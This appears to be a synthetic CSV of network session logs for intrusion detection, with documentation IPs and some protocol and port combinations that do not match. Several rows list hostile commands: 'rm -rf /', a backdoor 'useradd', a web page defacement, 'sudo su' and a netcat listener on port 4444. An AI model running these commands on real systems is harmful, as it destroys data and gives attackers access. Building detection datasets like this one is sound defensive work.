timestamp,duration,session_id,source_ip,source_port,destination_ip,destination_port,protocol,num_auth_attempts,command
2025-02-22 02:35:47.512,9,5107e5b5-be11-4d9a-90ff-bcf243f7547a,198.51.100.77,12992,198.51.100.123,80,ssh,1,
2025-02-22 02:28:56.512,9,9a648013-4c05-4824-b7d2-c12a288bd576,198.51.100.28,3807,198.51.100.235,80,http,2,rm -rf /home/user/*
2025-02-22 03:00:33.512,38,d5831bb0-acd0-4b80-96ed-2876b39fcbf7,203.0.113.154,51732,198.51.100.195,80,http,0,
2025-02-22 02:48:46.512,22,669199d4-17fa-4149-827d-7992a4315df6,192.0.2.33,23576,198.51.100.146,443,ssh,5,rm -rf /
2025-02-22 02:20:48.512,37,1e10a34a-afb7-42c9-a00e-f8429537fae7,192.0.2.78,30366,192.0.2.81,443,https,0,useradd -m hacker
2025-02-22 02:12:35.512,13,0e4cfee1-4e1a-4d5c-9ec5-f23f3f8c3d70,203.0.113.94,45168,198.51.100.240,443,http,5,
2025-02-22 02:09:10.512,32,b7c3146e-e906-4496-9520-114c0f528633,198.51.100.173,29737,203.0.113.235,443,https,0,
2025-02-22 02:19:43.512,37,aadfef9d-be0f-42f1-9cd9-a0e0c56dfca9,203.0.113.98,4064,198.51.100.73,443,http,0,
2025-02-22 02:28:30.512,38,4b5069de-4b0f-4525-9cba-563db25f42b8,192.0.2.184,60999,192.0.2.152,443,https,3,echo 'hacked' > /var/www/html/index.html
2025-02-22 02:27:18.512,32,943d421d-902c-4d86-a16e-f249de8c9137,192.0.2.167,8817,203.0.113.8,80,ssh,3,sudo su
2025-02-22 02:34:25.512,22,c3fff0be-2214-4f26-9f6c-645c3c80ae11,198.51.100.37,35505,192.0.2.89,80,ssh,5,
2025-02-22 02:14:22.512,49,168bfe05-9185-448f-bb43-f0f0d3a9e9e6,203.0.113.200,20344,198.51.100.80,80,https,3,
2025-02-22 02:55:22.512,16,a21bcdb6-d3bf-4542-816f-7e160a35f189,203.0.113.230,4146,198.51.100.149,443,ssh,2,
2025-02-22 02:34:37.512,2,ee12ef0f-ff74-4af9-91ab-af2ef17a5a6f,203.0.113.62,43543,203.0.113.251,80,ssh,4,
2025-02-22 02:22:40.512,8,d764edc2-4ac2-46e2-b142-fe0f5abd92f9,198.51.100.157,57199,203.0.113.154,80,http,4,
2025-02-22 02:45:50.512,41,0d58bd0f-5b66-4496-96a3-afa3eff7f037,203.0.113.179,53679,203.0.113.20,443,http,3,
2025-02-22 02:13:22.512,59,ef3a8e28-d099-462e-b4d6-5c72ae66ff1c,198.51.100.70,36593,203.0.113.151,443,https,5,
2025-02-22 02:08:43.512,60,0bbc1369-6567-4c6b-9b4c-ccd84bb7403e,198.51.100.54,7158,198.51.100.104,443,ssh,4,
2025-02-22 02:31:03.512,12,a1720a38-df22-450f-b1a9-df6b68677d1f,192.0.2.252,44331,198.51.100.110,80,http,1,
2025-02-22 02:49:45.512,22,1fbf7837-d12b-4684-a9d2-e0871228b2a7,203.0.113.160,23171,192.0.2.213,80,ssh,0,
2025-02-22 02:46:54.512,48,6180dd27-a27b-4fc1-887c-2abb715b9f07,198.51.100.217,21944,198.51.100.117,443,http,2,rm -rf /home/user/*
2025-02-22 02:35:33.512,10,46b99b5b-204c-4e3e-bc57-a7cdb0d37880,198.51.100.39,5237,198.51.100.207,80,http,4,
2025-02-22 02:38:42.512,18,3fd0b138-cfa8-4259-9653-776c34e4b5e0,192.0.2.50,34231,198.51.100.32,80,ssh,4,
2025-02-22 03:03:23.512,25,f6d52347-8465-49b6-a45f-87f99b883c86,192.0.2.58,52756,203.0.113.197,443,https,0,
2025-02-22 02:51:19.512,36,0e5ada52-5b03-492a-bf9a-28481859cebd,203.0.113.238,12195,198.51.100.26,443,http,1,nc -lvp 4444
2025-02-22 02:32:27.512,40,afda1e36-61bf-431e-93d5-40f11705834e,203.0.113.217,63455,192.0.2.86,80,ssh,4,
2025-02-22 02:45:36.512,58,6d18e172-38fb-4238-a999-d1b9dfd371e8,192.0.2.9,28580,192.0.2.42,80,https,0,
2025-02-22 02:46:23.512,55,f2fb65c7-4408-4219-82a4-00462bfa306b,203.0.113.212,10205,192.0.2.112,80,http,0,
2025-02-22 03:02:19.512,53,dd3fb9d2-6931-4c62-9d9f-584aca69b9d5,203.0.113.55,10123,198.51.100.145,80,ssh,1,nc -lvp 4444
2025-02-22 02:56:40.512,33,6f660346-15c1-488f-bcd8-044ee2a83fbf,203.0.113.111,40676,192.0.2.202,443,http,5,
2025-02-22 02:36:43.512,58,e7f25091-4566-4548-a62c-02fc898c0089,192.0.2.198,22469,198.51.100.47,443,ssh,0,
2025-02-22 02:17:58.512,41,7e55f9f3-59f8-42b5-9948-b476a52aae18,198.51.100.39,64103,192.0.2.152,443,http,0,
